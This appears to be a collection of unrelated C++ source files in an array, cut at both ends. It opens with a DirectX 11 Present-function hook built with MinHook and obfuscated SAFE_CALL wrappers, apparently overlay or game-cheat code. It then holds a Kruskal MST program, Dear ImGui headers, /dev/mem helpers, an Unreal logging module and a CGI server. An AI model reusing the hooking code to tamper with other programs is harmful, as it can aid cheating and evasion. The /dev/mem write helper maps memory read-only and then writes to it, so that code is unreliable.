100;\r\n\tbufferDesc.Height = 100;\r\n\tbufferDesc.RefreshRate = refreshRate;\r\n\tbufferDesc.Format = DXGI_FORMAT_R8G8B8A8_UNORM;\r\n\tbufferDesc.ScanlineOrdering = DXGI_MODE_SCANLINE_ORDER_UNSPECIFIED;\r\n\tbufferDesc.Scaling = DXGI_MODE_SCALING_UNSPECIFIED;\r\n\r\n\tDXGI_SAMPLE_DESC sampleDesc;\r\n\tsampleDesc.Count = 1;\r\n\tsampleDesc.Quality = 0;\r\n\r\n\tDXGI_SWAP_CHAIN_DESC swapChainDesc;\r\n\tswapChainDesc.BufferDesc = bufferDesc;\r\n\tswapChainDesc.SampleDesc = sampleDesc;\r\n\tswapChainDesc.BufferUsage = DXGI_USAGE_RENDER_TARGET_OUTPUT;\r\n\tswapChainDesc.BufferCount = 1;\r\n\tswapChainDesc.OutputWindow = WindowA;\r\n\tswapChainDesc.Windowed = 1;\r\n\tswapChainDesc.SwapEffect = DXGI_SWAP_EFFECT_DISCARD;\r\n\tswapChainDesc.Flags = DXGI_SWAP_CHAIN_FLAG_ALLOW_MODE_SWITCH;\r\n\r\n\tIDXGISwapChain* swapChain;\r\n\tID3D11Device* device;\r\n\tID3D11DeviceContext* context;\r\n\r\n\tif (((long(__stdcall*)(\r\n\t\tIDXGIAdapter*,\r\n\t\tD3D_DRIVER_TYPE,\r\n\t\tHMODULE,\r\n\t\tUINT,\r\n\t\tconst D3D_FEATURE_LEVEL*,\r\n\t\tUINT,\r\n\t\tUINT,\r\n\t\tconst DXGI_SWAP_CHAIN_DESC*,\r\n\t\tIDXGISwapChain**,\r\n\t\tID3D11Device**,\r\n\t\tD3D_FEATURE_LEVEL*,\r\n\t\tID3D11DeviceContext**))(D3D11CreateDeviceAndSwapChain))(0, D3D_DRIVER_TYPE_HARDWARE, 0, 0, featureLevels, 2, D3D11_SDK_VERSION, &swapChainDesc, &swapChain, &device, &featureLevel, &context) < 0)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tg_methodsTable = (uint64_t*)calloc(205, sizeof(uint64_t));\r\n\r\n\tmemcpy(g_methodsTable, *(uint64_t**)swapChain, 18 * sizeof(uint64_t));\r\n\tmemcpy(g_methodsTable + 18, *(uint64_t**)device, 43 * sizeof(uint64_t));\r\n\tmemcpy(g_methodsTable + 18 + 43, *(uint64_t**)context, 144 * sizeof(uint64_t));\r\n\r\n\tMH_Initialize();\r\n\r\n\tswapChain->Release();\r\n\tswapChain = 0;\r\n\r\n\tdevice->Release();\r\n\tdevice = 0;\r\n\r\n\tcontext->Release();\r\n\tcontext = 0;\r\n\r\n\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\treturn true;\r\n}\r\n\r\nbool Hook::Present(void** hk_originalFunction, void* hk_hookedPresent)\r\n{\r\n\tif (!hk_originalFunction || !hk_hookedPresent)\r\n\t\treturn false;\r\n\r\n\tvoid* target = (void*)g_methodsTable[8];\r\n\r\n\tif (!target)\r\n\t\treturn false;\r\n\r\n\tif (MH_CreateHook(target, hk_hookedPresent, hk_originalFunction) != MH_OK || MH_EnableHook(target) != MH_OK)\r\n\t{\r\n\t\treturn false;\r\n\t}\r\n\r\n\treturn true;\r\n}",
    "#include <iostream>\n#include <vector>\n#include <fstream>\n#include <stdexcept>\n#include <algorithm>\n\nstruct Edge {\n    int u, v, weight;\n    Edge(int u, int v, int weight) : u(u), v(v), weight(weight) {}\n};\n\nstruct Graph {\n    int V;\n    std::vector<Edge> edges;\n    bool isDirected;         \n\n    Graph(int V = 0, bool directed = false) : V(V), isDirected(directed) {}\n\n    void addEdge(int u, int v, int weight) {\n        edges.push_back(Edge(u, v, weight));\n        if (!isDirected) {\n            edges.push_back(Edge(v, u, weight));\n        }\n    }\n\n    void printGraph() const {\n        std::cout << \"Grafo lido:\\n\";\n        for (const Edge &e : edges) {\n            std::cout << e.u << \" -- \" << e.v << \" == \" << e.weight << \"\\n\";\n        }\n        std::cout << std::endl;\n    }\n};\n\nint findSet(int u, std::vector<int> &parent) {\n    if (u != parent[u])\n        parent[u] = findSet(parent[u], parent);\n    return parent[u];\n}\n\nvoid unionSets(int u, int v, std::vector<int> &parent, std::vector<int> &rank) {\n    int rootU = findSet(u, parent);\n    int rootV = findSet(v, parent);\n\n    if (rootU != rootV) {\n        if (rank[rootU] < rank[rootV])\n            parent[rootU] = rootV;\n        else if (rank[rootU] > rank[rootV])\n            parent[rootV] = rootU;\n        else {\n            parent[rootV] = rootU;\n            rank[rootU]++;\n        }\n    }\n}\n\nstd::vector<Edge> MSTKruskal(Graph &G) {\n    std::vector<Edge> A;\n    std::vector<int> parent(G.V), rank(G.V, 0);\n\n    std::cout << \"Executando Kruskal...\\n\";\n\n    for (int v = 0; v < G.V; ++v)\n        parent[v] = v;\n\n    std::sort(G.edges.begin(), G.edges.end(), [](Edge a, Edge b) {\n        return a.weight < b.weight;\n    });\n\n    for (Edge &e : G.edges) {\n        int u = e.u;\n        int v = e.v;\n\n        std::cout << \"Considerando aresta: \" << u << \" -- \" << v << \" com peso \" << e.weight << \"\\n\";\n\n        if (findSet(u, parent) != findSet(v, parent)) {\n            A.push_back(e);\n            std::cout << \"Aresta adicionada \u00e0 MST: \" << u << \" -- \" << v << \"\\n\";\n            unionSets(u, v, parent, rank);\n        } else {\n            std::cout << \"Aresta descartada para evitar ciclo: \" << u << \" -- \" << v << \"\\n\";\n        }\n    }\n\n    std::cout << \"\\nFinalizando Kruskal...\\n\";\n    return A;\n}\n\nvoid printMSTSummary(const std::vector<Edge> &mst) {\n    std::cout << \"\\nResumo final da MST:\\n\";\n    int totalWeight = 0;\n    for (const Edge &e : mst) {\n        std::cout << e.u << \" -- \" << e.v << \" == \" << e.weight << \"\\n\";\n        totalWeight += e.weight;\n    }\n    std::cout << \"Peso total da MST: \" << totalWeight << \"\\n\";\n}\n\nvoid readGraphFile(const std::string &filename, Graph &graph) {\n    std::ifstream file(filename);\n    if (!file.is_open()) {\n        throw std::runtime_error(\"N\u00e3o foi poss\u00edvel abrir o arquivo.\");\n    }\n\n    int graphType;\n    file >> graphType;\n\n    graph.isDirected = (graphType == 1);\n\n    int numVertices;\n    file >> numVertices;\n    if (numVertices <= 0) {\n        throw std::runtime_error(\"N\u00famero de v\u00e9rtices inv\u00e1lido.\");\n    }\n    graph.V = numVertices;\n\n    int u, v;\n    float weight;\n\n    while (file >> u >> v >> weight) {\n        if (u < 0 || u >= numVertices || v < 0 || v >= numVertices) {\n            throw std::runtime_error(\"Aresta com v\u00e9rtices fora do intervalo.\");\n        }\n        graph.addEdge(u, v, static_cast<int>(weight));\n    }\n\n    file.close();\n}\n\nint main() {\n    Graph G;\n\n    try {\n        readGraphFile(\"input.txt\", G);\n    } catch (const std::exception &e) {\n        std::cerr << \"Erro: \" << e.what() << std::endl;\n        return 1;\n    }\n\n    G.printGraph();\n\n    std::vector<Edge> mst = MSTKruskal(G);\n\n    printMSTSummary(mst);\n\n    return 0;\n}\n",
    "// dear imgui: Platform Backend for GLFW\n// This needs to be used along with a Renderer (e.g. OpenGL3, Vulkan, WebGPU..)\n// (Info: GLFW is a cross-platform general purpose library for handling windows, inputs, OpenGL/Vulkan graphics context creation, etc.)\n// (Requires: GLFW 3.1+. Prefer GLFW 3.3+ or GLFW 3.4+ for full feature support.)\n\n// Implemented features:\n//  [X] Platform: Clipboard support.\n//  [X] Platform: Mouse support. Can discriminate Mouse/TouchScreen/Pen (Windows only).\n//  [X] Platform: Keyboard support. Since 1.87 we are using the io.AddKeyEvent() function. Pass ImGuiKey values to all key functions e.g. ImGui::IsKeyPressed(ImGuiKey_Space). [Legacy GLFW_KEY_* values will also be supported unless IMGUI_DISABLE_OBSOLETE_KEYIO is set]\n//  [X] Platform: Gamepad support. Enable with 'io.ConfigFlags |= ImGuiConfigFlags_NavEnableGamepad'.\n//  [X] Platform: Mouse cursor shape and visibility. Disable with 'io.ConfigFlags |= ImGuiConfigFlags_NoMouseCursorChange' (note: the resizing cursors requires GLFW 3.4+).\n//  [X] Platform: Multi-viewport support (multiple windows). Enable with 'io.ConfigFlags |= ImGuiConfigFlags_ViewportsEnable'.\n// Issues:\n//  [ ] Platform: Multi-viewport: ParentViewportID not honored, and so io.ConfigViewportsNoDefaultParent has no effect (minor).\n\n// You can use unmodified imgui_impl_* files in your project. See examples/ folder for examples of using this.\n// Prefer including the entire imgui/ repository into your project (either as a copy or as a submodule), and only build the backends you need.\n// Learn about Dear ImGui:\n// - FAQ                  https://dearimgui.com/faq\n// - Getting Started      https://dearimgui.com/getting-started\n// - Documentation        https://dearimgui.com/docs (same as your local docs/ folder).\n// - Introduction, links and more at the top of imgui.cpp\n\n// About Emscripten support:\n// - Emscripten provides its own GLFW (3.2.1) implementation (syntax: \"-sUSE_GLFW=3\"), but Joystick is broken and several features are not supported (multiple windows, clipboard, timer, etc.)\n// - A third-party Emscripten GLFW (3.4.0) implementation (syntax: \"--use-port=contrib.glfw3\") fixes the Joystick issue and implements all relevant features for the browser.\n// See https://github.com/pongasoft/emscripten-glfw/blob/master/docs/Comparison.md for details.\n\n// CHANGELOG\n// (minor and older changes stripped away, please see git history for details)\n//  2024-XX-XX: Platform: Added support for multiple windows via the ImGuiPlatformIO interface.\n//  2024-08-22: moved some OS/backend related function pointers from ImGuiIO to ImGuiPlatformIO:\n//               - io.GetClipboardTextFn    -> platform_io.Platform_GetClipboardTextFn\n//               - io.SetClipboardTextFn    -> platform_io.Platform_SetClipboardTextFn\n//               - io.PlatformOpenInShellFn -> platform_io.Platform_OpenInShellFn\n//  2024-07-31: Added ImGui_ImplGlfw_Sleep() helper function for usage by our examples app, since GLFW doesn't provide one.\n//  2024-07-08: *BREAKING* Renamed ImGui_ImplGlfw_InstallEmscriptenCanvasResizeCallback to ImGui_ImplGlfw_InstallEmscriptenCallbacks(), added GLFWWindow* parameter.\n//  2024-07-08: Emscripten: Added support for GLFW3 contrib port (GLFW 3.4.0 features + bug fixes): to enable, replace -sUSE_GLFW=3 with --use-port=contrib.glfw3 (requires emscripten 3.1.59+) (https://github.com/pongasoft/emscripten-glfw)\n//  2024-07-02: Emscripten: Added io.PlatformOpenInShellFn() handler for Emscripten versions.\n//  2023-12-19: Emscripten: Added ImGui_ImplGlfw_InstallEmscriptenCanvasResizeCallback() to register canvas selector and auto-resize GLFW window.\n//  2023-10-05: Inputs: Added support for extra ImGuiKey values: F13 to F24 function keys.\n//  2023-07-18: Inputs: Revert ignoring mouse data on GLFW_CURSOR_DISABLED as it can be used differently. User may set ImGuiConfigFLags_NoMouse if desired. (#5625, #6609)\n//  2023-06-12: Accept glfwGetTime() not returning a monotonically increasing value. This seems to happens on some Windows setup when peripherals disconnect, and is likely to also happen on browser + Emscripten. (#6491)\n//  2023-04-04: Inputs: Added support for io.AddMouseSourceEvent() to discriminate ImGuiMouseSource_Mouse/ImGuiMouseSource_TouchScreen/ImGuiMouseSource_Pen on Windows ONLY, using a custom WndProc hook. (#2702)\n//  2023-03-16: Inputs: Fixed key modifiers handling on secondary viewports (docking branch). Broken on 2023/01/04. (#6248, #6034)\n//  2023-03-14: Emscripten: Avoid using glfwGetError() and glfwGetGamepadState() which are not correctly implemented in Emscripten emulation. (#6240)\n//  2023-02-03: Emscripten: Registering custom low-level mouse wheel handler to get more accurate scrolling impulses on Emscripten. (#4019, #6096)\n//  2023-01-18: Handle unsupported glfwGetVideoMode() call on e.g. Emscripten.\n//  2023-01-04: Inputs: Fixed mods state on Linux when using Alt-GR text input (e.g. German keyboard layout), could lead to broken text input. Revert a 2022/",
    "//\n// Created by whx on 24-11-1.\n//\n\n/**\n\u7b56\u7565\u6a21\u5f0f\u9700\u8981\u6211\u4eec\u5b9a\u4e49\u4e00\u7cfb\u5217\u7684\u7b97\u6cd5\uff0c\u5e76\u4e14\u5c06\u6bcf\u79cd\u7b97\u6cd5\u90fd\u653e\u5165\u5230\u72ec\u7acb\u7684\u7c7b\u4e2d\uff0c\u5728\u5b9e\u9645\u64cd\u4f5c\u7684\u65f6\u5019\u4f7f\u8fd9\u4e9b\u7b97\u6cd5\u5bf9\u8c61\u53ef\u4ee5\u76f8\u4e92\u66ff\u6362\n**/\n\n#include <memory>\n#include <iostream>\n\nenum class GirlName {\n    \u516b\u5948\u89c1\u674f\u83dc,\n    \u6e29\u6c34\u4f73\u6811,\n    \u5fd7\u559c\u5c4b\n};\n\nclass Girl {\npublic:\n    virtual ~Girl() = default;\n\n    virtual void faver() = 0;\n};\n\nclass XiaoBa final : public Girl {\npublic:\n    void faver() override {\n        std::cout << \"eat\" << '\\n';\n    }\n};\n\nclass JiaShu final : public Girl {\npublic:\n    void faver() override {\n        std::cout << \"wenshui\" << '\\n';\n    }\n};\n\nclass ZhiXi final : public Girl {\npublic:\n    void faver() override {\n        std::cout << \"sleep\" << '\\n';\n    }\n};\n\nclass WenShui {\npublic:\n    void aver() {\n        switch (_girl_name) {\n            case GirlName::\u516b\u5948\u89c1\u674f\u83dc:\n                _girl = std::make_shared<XiaoBa>();\n                break;\n            case GirlName::\u6e29\u6c34\u4f73\u6811:\n                _girl = std::make_shared<JiaShu>();\n                break;\n            case GirlName::\u5fd7\u559c\u5c4b:\n                _girl = std::make_shared<ZhiXi>();\n                break;\n            default:\n                break;\n        }\n        _girl->faver();\n    }\n\nprivate:\n    GirlName _girl_name = GirlName::\u516b\u5948\u89c1\u674f\u83dc;\n    std::shared_ptr<Girl> _girl;\n};\n\nint main() {\n    const auto wen_shui = std::make_shared<WenShui>();\n    wen_shui->aver();\n}",
    "// dear imgui, v1.91.4 WIP\n// (main code and documentation)\n\n// Help:\n// - See links below.\n// - Call and read ImGui::ShowDemoWindow() in imgui_demo.cpp. All applications in examples/ are doing that.\n// - Read top of imgui.cpp for more details, links and comments.\n\n// Resources:\n// - FAQ ........................ https://dearimgui.com/faq (in repository as docs/FAQ.md)\n// - Homepage ................... https://github.com/ocornut/imgui\n// - Releases & changelog ....... https://github.com/ocornut/imgui/releases\n// - Gallery .................... https://github.com/ocornut/imgui/issues?q=label%3Agallery (please post your screenshots/video there!)\n// - Wiki ....................... https://github.com/ocornut/imgui/wiki (lots of good stuff there)\n//   - Getting Started            https://github.com/ocornut/imgui/wiki/Getting-Started (how to integrate in an existing app by adding ~25 lines of code)\n//   - Third-party Extensions     https://github.com/ocornut/imgui/wiki/Useful-Extensions (ImPlot & many more)\n//   - Bindings/Backends          https://github.com/ocornut/imgui/wiki/Bindings (language bindings, backends for various tech/engines)\n//   - Glossary                   https://github.com/ocornut/imgui/wiki/Glossary\n//   - Debug Tools                https://github.com/ocornut/imgui/wiki/Debug-Tools\n//   - Software using Dear ImGui  https://github.com/ocornut/imgui/wiki/Software-using-dear-imgui\n// - Issues & support ........... https://github.com/ocornut/imgui/issues\n// - Test Engine & Automation ... https://github.com/ocornut/imgui_test_engine (test suite, test engine to automate your apps)\n\n// For first-time users having issues compiling/linking/running/loading fonts:\n// please post in https://github.com/ocornut/imgui/discussions if you cannot find a solution in resources above.\n// Everything else should be asked in 'Issues'! We are building a database of cross-linked knowledge there.\n\n// Copyright (c) 2014-2024 Omar Cornut\n// Developed by Omar Cornut and every direct or indirect contributors to the GitHub.\n// See LICENSE.txt for copyright and licensing details (standard MIT License).\n// This library is free but needs your support to sustain development and maintenance.\n// Businesses: you can support continued development via B2B invoiced technical support, maintenance and sponsoring contracts.\n// PLEASE reach out at omar AT dearimgui DOT com. See https://github.com/ocornut/imgui/wiki/Funding\n// Businesses: you can also purchase licenses for the Dear ImGui Automation/Test Engine.\n\n// It is recommended that you don't modify imgui.cpp! It will become difficult for you to update the library.\n// Note that 'ImGui::' being a namespace, you can add functions into the namespace from your own source files, without\n// modifying imgui.h or imgui.cpp. You may include imgui_internal.h to access internal data structures, but it doesn't\n// come with any guarantee of forward compatibility. Discussing your changes on the GitHub Issue Tracker may lead you\n// to a better solution or official support for them.\n\n/*\n\nIndex of this file:\n\nDOCUMENTATION\n\n- MISSION STATEMENT\n- CONTROLS GUIDE\n- PROGRAMMER GUIDE\n  - READ FIRST\n  - HOW TO UPDATE TO A NEWER VERSION OF DEAR IMGUI\n  - GETTING STARTED WITH INTEGRATING DEAR IMGUI IN YOUR CODE/ENGINE\n  - HOW A SIMPLE APPLICATION MAY LOOK LIKE\n  - HOW A SIMPLE RENDERING FUNCTION MAY LOOK LIKE\n- API BREAKING CHANGES (read me when you update!)\n- FREQUENTLY ASKED QUESTIONS (FAQ)\n  - Read all answers online: https://www.dearimgui.com/faq, or in docs/FAQ.md (with a Markdown viewer)\n\nCODE\n(search for \"[SECTION]\" in the code to find them)\n\n// [SECTION] INCLUDES\n// [SECTION] FORWARD DECLARATIONS\n// [SECTION] CONTEXT AND MEMORY ALLOCATORS\n// [SECTION] USER FACING STRUCTURES (ImGuiStyle, ImGuiIO, ImGuiPlatformIO)\n// [SECTION] MISC HELPERS/UTILITIES (Geometry functions)\n// [SECTION] MISC HELPERS/UTILITIES (String, Format, Hash functions)\n// [SECTION] MISC HELPERS/UTILITIES (File functions)\n// [SECTION] MISC HELPERS/UTILITIES (ImText* functions)\n// [SECTION] MISC HELPERS/UTILITIES (Color functions)\n// [SECTION] ImGuiStorage\n// [SECTION] ImGuiTextFilter\n// [SECTION] ImGuiTextBuffer, ImGuiTextIndex\n// [SECTION] ImGuiListClipper\n// [SECTION] STYLING\n// [SECTION] RENDER HELPERS\n// [SECTION] INITIALIZATION, SHUTDOWN\n// [SECTION] MAIN CODE (most of the code! lots of stuff, needs tidying up!)\n// [SECTION] ID STACK\n// [SECTION] INPUTS\n// [SECTION] ERROR CHECKING, STATE RECOVERY\n// [SECTION] ITEM SUBMISSION\n// [SECTION] LAYOUT\n// [SECTION] SCROLLING\n// [SECTION] TOOLTIPS\n// [SECTION] POPUPS\n// [SECTION] KEYBOARD/GAMEPAD NAVIGATION\n// [SECTION] DRAG AND DROP\n// [SECTION] LOGGING/CAPTURING\n// [SECTION] SETTINGS\n// [SECTION] LOCALIZATION\n// [SECTION] VIEWPORTS, PLATFORM WINDOWS\n// [SECTION] PLATFORM DEPENDENT HELPERS\n// [SECTION] METRICS/DEBUGGER WINDOW\n// [SECTION] DEBUG LOG WINDOW\n// [SECTION] OTHER DEBUG TOOLS (ITEM PICKER, ID STACK TOOL)\n\n*/\n\n//----------------------------------------------------------------------",
    "/* This file makes use of Doxygen syntax for generating documentation. */\n/******************************************************************************/\n/**\n * @file access_devmem.cpp\n * @brief File containing /dev/mem access functions.\n *\n * This contains the function definitions for an API to the /dev/mem driver. It\n * provides functions for accessing the memory accessible by /dev/mem.\n *\n * @author John H. Willis (willisjh)\n * @date 29 March 2022\n *\n * @bug No known bugs.\n *\n * @addtogroup AccessDevMem\n * @{\n *\n ******************************************************************************/\n\n\n/****************************** Include Files *********************************/\n#include \"common/access/access_devmem.hpp\"\n\n#include <unistd.h>\n#include <sys/mman.h>\n#include <fcntl.h>\n\n#include <stdexcept>\n#include <cstring>\n#include <cerrno>\n#include <cstdio>\n\n#include \"common/exception_priority/exception_priority.hpp\"\n\n/*************************** Constant Definitions *****************************/\n\n/***************************** Type Definitions *******************************/\n\n/****************** Macros (Inline Functions) Definitions *********************/\n\n/*************************** Function Prototypes ******************************/\n\n/*************************** Variable Definitions *****************************/\n\n\n/******************************************************************************/\n/**\n * Function for reading 32 bits from an address on /dev/mem.\n *\n * @param[in]  addr_physical The byte-aligned physical address to read from.\n * @param[out] val_read      The value read.\n *\n * @return None.\n *\n * @note None.\n *\n ******************************************************************************/\nvoid ReadDevMem(const uintptr_t addr_physical, uint32_t& val_read)\n{\n    /**- Open /dev/mem driver. */\n    const auto fd_devmem = open(\"/dev/mem\", O_RDONLY);\n    if (fd_devmem == -1)\n    {\n        throw ExceptionPriority<std::runtime_error>(IDPriority::kIdErr, static_cast<std::string>(strerror(errno)) + \" Could not open /dev/mem!\");\n    }\n\n    /* Calculate page-aligned address and offset. */\n    const auto cb_page = sysconf(_SC_PAGESIZE);\n    const auto addr_physical_page = (addr_physical & ~(cb_page - 1));\n    const auto baddr_physical_page_src = addr_physical - addr_physical_page;\n\n    /**- MMap /dev/mem memory space. */\n    void* const p_mmap = mmap(nullptr, cb_page, PROT_READ, MAP_SHARED, fd_devmem, addr_physical_page);\n    if (p_mmap == MAP_FAILED)\n    {\n        close(fd_devmem);\n\n        throw ExceptionPriority<std::runtime_error>(IDPriority::kIdErr, static_cast<std::string>(strerror(errno)) + \" Could not mmap address: \" + std::to_string(addr_physical) + \"!\");\n    }\n\n    /**- Read from /dev/mem memory space. */\n    val_read = *static_cast<uint32_t*>(static_cast<void*>(static_cast<uint8_t*>(p_mmap) + baddr_physical_page_src));\n\n    /**- Close out resources. */\n    close(fd_devmem);\n    munmap(p_mmap, cb_page);\n}\n\n/******************************************************************************/\n/**\n * Function for writing 32 bits from an address on /dev/mem.\n *\n * @param[in]  addr_physical The byte-aligned physical address to write to.\n * @param[out] val_write     The value to be written.\n *\n * @return None.\n *\n * @note None.\n *\n ******************************************************************************/\nvoid WriteDevMem(const uintptr_t addr_physical, const uint32_t val_write)\n{\n    /**- Open /dev/mem driver. */\n    const auto fd_devmem = open(\"/dev/mem\", O_RDWR);\n    if (fd_devmem == -1)\n    {\n        throw ExceptionPriority<std::runtime_error>(IDPriority::kIdErr, static_cast<std::string>(strerror(errno)) + \" Could not open /dev/mem\");\n    }\n\n    /* Calculate page-aligned address and offset. */\n    const auto cb_page = sysconf(_SC_PAGESIZE);\n    const auto addr_physical_page = (addr_physical & ~(cb_page - 1));\n    const auto baddr_physical_page_dest = addr_physical - addr_physical_page;\n\n    /**- MMap /dev/mem memory space. */\n    void* const p_mmap = mmap(nullptr, cb_page, PROT_READ, MAP_SHARED, fd_devmem, addr_physical_page);\n    if (p_mmap == MAP_FAILED)\n    {\n        close(fd_devmem);\n\n        throw ExceptionPriority<std::runtime_error>(IDPriority::kIdErr, static_cast<std::string>(strerror(errno)) + \" Could not mmap address: \" + std::to_string(addr_physical) + \"!\");\n    }\n\n    /**- Write to /dev/mem memory space. */\n    *(static_cast<uint32_t*>(static_cast<void*>(static_cast<uint8_t*>(p_mmap) + baddr_physical_page_dest))) = val_write;\n\n    /**- Close out resources. */\n    close(fd_devmem);\n    munmap(p_mmap, cb_page);\n}\n\n/*****************************************************************************/\n/**\n * Function for reading from an address on /dev/mem to a vector.\n *\n * @param[in]  addr_physical The byte-aligned physical address to read from.\n * @param[in]  cwrgval_read  The count of words to read.\n * @param[out] vval_read     The vector of values read.\n *\n * @return None.\n *\n * @note None.\n ",
    "// Copyright ZhangHaiJun 710605420@qq.com, Inc. All Rights Reserved.\n\n#include \"UnrealMultiLog.h\"\n\n#define LOCTEXT_NAMESPACE \"FUnrealMultiLogModule\"\nFMultiThreadedLogDevice* FUnrealMultiLogModule::MultiThreadedLogDevice = nullptr;\n\n\nconst int32 IgnoreCount = 1; // Ignore the current function in the stack trace\nconst SIZE_T StackBufferSize = 4096; // Size of the buffer to hold the stack trace\nANSICHAR StackTraceBuffer[StackBufferSize] = {0};\n\nstatic const int MAX_DEPTH = 200;\nuint64 StackTrace[MAX_DEPTH] = {0};\n\nvoid StackWalkAndDump(ANSICHAR* InHumanReadableString, SIZE_T InHumanReadableStringSize, int32 InIgnoreCount = 1, void* InContext = nullptr)\n{\n\t// If the callstack is for the executing thread, ignore this function and the FPlatformStackWalk::CaptureStackBackTrace call below\n\tif (InContext == nullptr)\n\t{\n\t\tInIgnoreCount += 2;\n\t}\n\n\t// Capture stack backtrace.\n\tuint32 Depth = FPlatformStackWalk::CaptureStackBackTrace(StackTrace, MAX_DEPTH, InContext);\n\n\t// Skip the first two entries as they are inside the stack walking code.\n\tuint32 CurrentDepth = InIgnoreCount;\n\twhile (CurrentDepth < Depth)\n\t{\n\t\tFPlatformStackWalk::ProgramCounterToHumanReadableString(CurrentDepth, StackTrace[CurrentDepth], InHumanReadableString, InHumanReadableStringSize, reinterpret_cast<FGenericCrashContext*>(InContext));\n\t\tFCStringAnsi::Strncat(InHumanReadableString, LINE_TERMINATOR_ANSI, (int32)InHumanReadableStringSize);\n\t\tCurrentDepth++;\n\t}\n}\n\nvoid CaptureStackTrace(ANSICHAR* OutStackTrace, SIZE_T InBufferSize)\n{\n\t// Call the StackWalkAndDump function\n\t//FPlatformStackWalk::StackWalkAndDump(StackTraceBuffer, InBufferSize, IgnoreCount);\n\tStackWalkAndDump(StackTraceBuffer, InBufferSize, IgnoreCount);\n}\n\n\nvoid FUnrealMultiLogModule::HandleShutdownAfterError()\n{\n    CaptureStackTrace(StackTraceBuffer, StackBufferSize);\n    if (MultiThreadedLogDevice)\n    {\n        MultiThreadedLogDevice->CrashCaptureLog(StackTraceBuffer);\n    }\n\tif (GError)\n\t{\n\t\tGError->Flush();\n\t\tGError->HandleError();\n\t}\n\t\n\tif (GLog)\n\t{\n\t\tGLog->Flush();\n\t}\n\n}\n\nvoid FUnrealMultiLogModule::StartupModule()\n{\n\t// This code will execute after your module is loaded into memory; the exact timing is specified in the .uplugin file per-module\n\t\n\tInitializeMultiThreadedLogging();\n\t//FCoreDelegates::OnHandleSystemError.AddRaw(this, &FUnrealMultiLogModule::HandleShutdownAfterError);\n    //FCoreDelegates::OnShutdownAfterError.AddRaw(this, &FUnrealMultiLogModule::HandleShutdownAfterError);\n\n}\n\nvoid FUnrealMultiLogModule::ShutdownModule()\n{\n\t// This function may be called during shutdown to clean up your module.  For modules that support dynamic reloading,\n\t// we call this function before unloading the module.\n\n\tShutdownMultiThreadedLogging();\n   // FCoreDelegates::OnHandleSystemError.RemoveAll(this);\n\t//FCoreDelegates::OnShutdownAfterError.RemoveAll(this);\n\n\n}\n\n#undef LOCTEXT_NAMESPACE\n\t\nIMPLEMENT_MODULE(FUnrealMultiLogModule, UnrealMultiLog)",
    "#include \"../header/read_conf.hpp\"\n\nint main() {\n    int server_fd, new_socket;\n    struct sockaddr_in address;\n    int opt = 1;\n    int addrlen = sizeof(address);\n    char buffer[1024] = {0};\n\n    // Tworzenie gniazda\n    server_fd = socket(AF_INET, SOCK_STREAM, 0);\n    if (server_fd == 0) {\n        std::cerr << \"Nie uda\u0142o si\u0119 utworzy\u0107 gniazda\\n\";\n        return -1;\n    }\n\n    // Konfiguracja socketu\n    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt));\n\n    // Konfiguracja serwera\n    address.sin_family = AF_INET;\n    address.sin_addr.s_addr = INADDR_ANY;\n    address.sin_port = htons(8080);\n\n    // Bindowanie socketu\n    bind(server_fd, (struct sockaddr *)&address, sizeof(address));\n\n    // Nas\u0142uchiwanie\n    listen(server_fd, 3);\n\n    std::cout << \"Serwer nas\u0142uchuje na porcie 8080\\n\";\n\n    while (true) {\n        // Akceptowanie po\u0142\u0105czenia\n        new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen);\n\n        if (new_socket < 0) {\n            std::cerr << \"B\u0142\u0105d po\u0142\u0105czenia\\n\";\n            return -1;\n        }\n\n        // Odbieranie danych od przegl\u0105darki\n        read(new_socket, buffer, 1024);\n        // std::cout << \"Odebrano \u017c\u0105danie:\\n\" << buffer << std::endl;\n        // Sprawdzanie, czy to jest \u017c\u0105danie CGI (np. POST)\n        if (strstr(buffer, \"POST /\") != nullptr) {\n            // Znalezienie Content-Length (d\u0142ugo\u015b\u0107 danych POST)\n            char *content_length_str = strstr(buffer, \"Content-Length:\");\n            int content_length = 0;\n            if (content_length_str != nullptr) {\n                sscanf(content_length_str, \"Content-Length: %d\", &content_length);\n            }\n\n            // Tworzenie bufora na dane POST\n            char *post_data = new char[content_length + 1]();\n            read(new_socket, post_data, content_length);\n\n            // Utworzenie procesu potomnego dla skryptu CGI\n            pid_t pid = fork();\n            if (pid == 0) {  // Proces potomny\n                // Ustawienie zmiennych \u015brodowiskowych dla skryptu CGI\n                setenv(\"REQUEST_METHOD\", \"POST\", 1);\n                setenv(\"CONTENT_LENGTH\", std::to_string(content_length).c_str(), 1);\n\n                // Przekazywanie danych POST przez standardowe wej\u015bcie (stdin)\n                dup2(new_socket, STDIN_FILENO);\n\n                // Uruchomienie skryptu CGI\n                const char *args[] = {\"/path/to/cgi-bin/script.cgi\", nullptr};  // \u015acie\u017cka do skryptu\n                execvp(args[0], (char *const *)args);\n\n                // Je\u015bli execvp si\u0119 nie powiedzie\n                exit(EXIT_FAILURE);\n            } else {  // Proces rodzica\n                // Oczekiwanie na zako\u0144czenie procesu CGI\n                waitpid(pid, nullptr, 0);\n\n                // Zwracanie odpowiedzi HTTP (np. wyniku skryptu CGI)\n                const char *http_response =\n                    \"HTTP/1.1 200 OK\\r\\n\"\n                    \"Content-Type: text/html\\r\\n\"\n                    \"Content-Length: 400\\r\\n\"\n                    \"\\n\"\n                    \"<h1>Wynik skryptu CGI</h1>\";\n                send(new_socket, http_response, strlen(http_response), 0);\n                std::cout << \"Odpowied\u017a CGI zosta\u0142a wys\u0142ana do klienta\\n\";\n            }\n\n            delete[] post_data;\n        } else if (strstr(buffer, \"GET /\") != nullptr) {\n                // Przyk\u0142ad dla metody GET (dane przekazywane przez QUERY_STRING)\n            char *query_string = strstr(buffer, \"GET /\");\n            if (query_string != nullptr) {\n                // Pobieranie warto\u015bci QUERY_STRING z URI\n                \n                int pipefd[2];\n                if (pipe(pipefd) == -1) {\n                    std::cerr << \"B\u0142\u0105d przy tworzeniu pipe.\" << std::endl;\n                    return 1;\n                }\n\n                char *end_of_uri = strchr(query_string, 